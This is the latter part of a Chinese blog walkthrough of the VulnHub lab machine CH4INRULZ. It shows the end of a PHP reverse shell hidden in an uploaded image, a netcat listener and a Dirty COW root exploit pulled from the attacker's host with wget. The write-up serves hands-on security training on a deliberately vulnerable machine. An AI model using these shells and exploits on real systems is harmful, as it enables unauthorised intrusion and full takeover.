<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="173"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="174"></td><td><pre></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token comment">// Like print, but does nothing if we've daemonised ourself</span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></pre></td></tr><tr><td data-num="183"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="187"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="188"></td><td><pre></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>​</p><p>修改监听 <code>ip端口</code> ，将源码粘贴到任意一张图片后上传。</p><p>再开启监听</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nc <span class="token operator">-</span>lvvp <span class="token number">1234</span></pre></td></tr></table></figure><p>可以成功返回 shell。</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181653448-260492717.png" alt="image"></p><h2 id="权限提升"><a class="anchor" href="#权限提升">#</a> 权限提升</h2><p>之前我们在使用 <code>nmap</code> 扫描时发现，该服务器的内核版本为 <code>linux 2.6.X</code> 。</p><p>用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZpcmVGYXJ0L2RpcnR5Y293">脏牛</span>试一试，尝试不能直接下载 <code>github</code> 上的文件，先在 <code>kali</code> 下载并编译：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>FireFart<span class="token operator">/</span>dirtycow<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181807368-1575042867.png" alt="image"></p><p>然后将 <code>dirty</code> 放到 <code>/var/www/html/</code> 目录下， <code>kali开启web服务</code> ，在靶机上下载该文件</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>weget http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span><span class="token operator">/</span>dirty</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181833354-368513209.png" alt="image"></p><p>赋予权限后运行:</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181842344-552158689.png" alt="image"></p><p>获取到账号和密码：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>firefart</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">123456</span></pre></td></tr></table></figure><p>直接账号登录失败</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181854076-1116046616.png" alt="image"></p><p>用 <code>xshell</code> 登陆，成功</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181944096-1353533063.png" alt="image"></p><h3 id="获取-flag"><a class="anchor" href="#获取-flag">#</a> 获取 flag</h3><p>进入 <code>/root</code> 目录下：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181958783-1514138770.png" alt="image"></p><p>成功拿到 flag。</p><div class="tags"><a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/" rel="tag"><i class="ic i-tag"></i> vulnhub靶机实战</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-01-06 16:43:01" itemprop="dateModified" datetime="2022-01-06T16:43:01+08:00">2022-01-06</time> </span><span id="article/3f0418ee.html" class="item leancloud_visitors" data-flag-title="vulnhub靶场实战-CH4INRULZ_v1.0.1" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>21r000 <i class="ic i-at"><em>@</em></i>未入江湖，怎敢佩刀</li><li class="link"><strong>本文链接：</strong> <a href="https://www.21r000.xyz/article/3f0418ee.html" title="vulnhub靶场实战-CH4INRULZ_v1.0.1">https://www.21r000.xyz/article/3f0418ee.html</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/article/50ab0d7.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;Is21r000&#x2F;image&#x2F;raw&#x2F;master&#x2F;picgo&#x2F;6833939bly1gipeuibk9fj20zk0m8ay2.jpg" title="vulnhub靶机-School"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> vulnhub靶机实战</span><h3>vulnhub靶机-School</h3></a></div><div class="item right"><a href="/article/4610d5dd.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;Is21r000&#x2F;image&#x2F;raw&#x2F;master&#x2F;picgo&#x2F;086890bbbfa003e59595fb58c65c20a.jpg" title="四进制解码"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> CTF</span><h3>四进制解码</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.</span> <span class="toc-text">漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp-%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.1.</span> <span class="toc-text">ftp 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.2.</span> <span class="toc-text">http 服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">7.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-flag"><span class="toc-number">7.1.</span> <span class="toc-text">获取 flag</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/article/50ab0d7.html" rel="bookmark" title="vulnhub靶机-School">vulnhub靶机-School</a></li><li class="active"><a href="/article/3f0418ee.html" rel="bookmark" title="vulnhub靶场实战-CH4INRULZ_v1.0.1">vulnhub靶场实战-CH4INRULZ_v1.0.1</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="21r000" data-src="/images/avatar.jpg"><p class="name" itemprop="name">21r000</p><div class="description" itemprop="description">固态规则长方体空间移动工程师</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">54</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">7</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item Github" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMA==" title="https:&#x2F;&#x2F;github.com&#x2F;21r000"><i class="ic i-github"></i></span> <span class="exturl item QQ" data-url="dGVuY2VudDovL21lc3NhZ2UvP3Vpbj0yODU1MTQ1MTEzJlNpdGU9Jk1lbnU9eWVz" title="tencent:&#x2F;&#x2F;message&#x2F;?uin&#x3D;2855145113&amp;Site&#x3D;&amp;Menu&#x3D;yes"><i class="ic i-qq"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/article/50ab0d7.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/article/4610d5dd.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a></div><span><a href="/article/8d4c4fc4.html" title="第四届浙江省网络安全技能竞赛决赛部分WP">第四届浙江省网络安全技能竞赛决赛部分WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/SNote/" title="分类于 SNote">SNote</a></div><span><a href="/article/189db1b1.html" title="汇编语言Studying Note之条件结构与条件控制流伪指令学习">汇编语言Studying Note之条件结构与条件控制流伪指令学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="分类于 内网渗透">内网渗透</a></div><span><a href="/article/ffbd8b0.html" title="windows信息搜集篇（二）之SPN">windows信息搜集篇（二）之SPN</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/SNote/" title="分类于 SNote">SNote</a></div><span><a href="/article/f2951c20.html" title="汇编语言Studying Note之内联汇编">汇编语言Studying Note之内联汇编</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/article/39bc4a94.html" title="CVE-2020-0796 (SMBv3远程代码执行) Windows-10">CVE-2020-0796 (SMBv3远程代码执行) Windows-10</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="分类于 内网渗透">内网渗透</a></div><span><a href="/article/1df695da.html" title="Active Directory域服务：域信任">Active Directory域服务：域信任</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/vulnhub%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/" title="分类于 vulnhub靶机实战">vulnhub靶机实战</a></div><span><a href="/article/3f0418ee.html" title="vulnhub靶场实战-CH4INRULZ_v1.0.1">vulnhub靶场实战-CH4INRULZ_v1.0.1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/SNote/" title="分类于 SNote">SNote</a></div><span><a href="/article/e0c9facc.html" title="汇编语言初步学习记录">汇编语言初步学习记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="分类于 内网渗透">内网渗透</a></div><span><a href="/article/cdbe6e7b.html" title="浅谈内网渗透中有关隧道的那些事儿">浅谈内网渗透中有关隧道的那些事儿</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="分类于 内网渗透">内网渗透</a></div><span><a href="/article/aea05eaa.html" title="内网渗透学习之 Net-NTLM Relay Attack">内网渗透学习之 Net-NTLM Relay Attack</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-"></i> </span><span class="author" itemprop="copyrightHolder">21r000 @ 21r000</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">234k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">3:32</span></div><div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">本站总访问量：<span id="busuanzi_value_site_pv"></span>次</span> <span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数：<span id="busuanzi_value_site_uv"></span>人</span></div><div class="beian-info"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">浙ICP备2022001000号-1</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"article/3f0418ee.html",favicon:{show:"（●´3｀●）大通りからジェーンまで",hide:"(´Д｀)金を独行する"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,model:{jsonPath:"/live2dw/assets/wanko.model.json"},display:{position:"right",width:150,height:200},mobile:{show:!1},log:!1})</script></body></html><!-- rebuild by hrmmi -->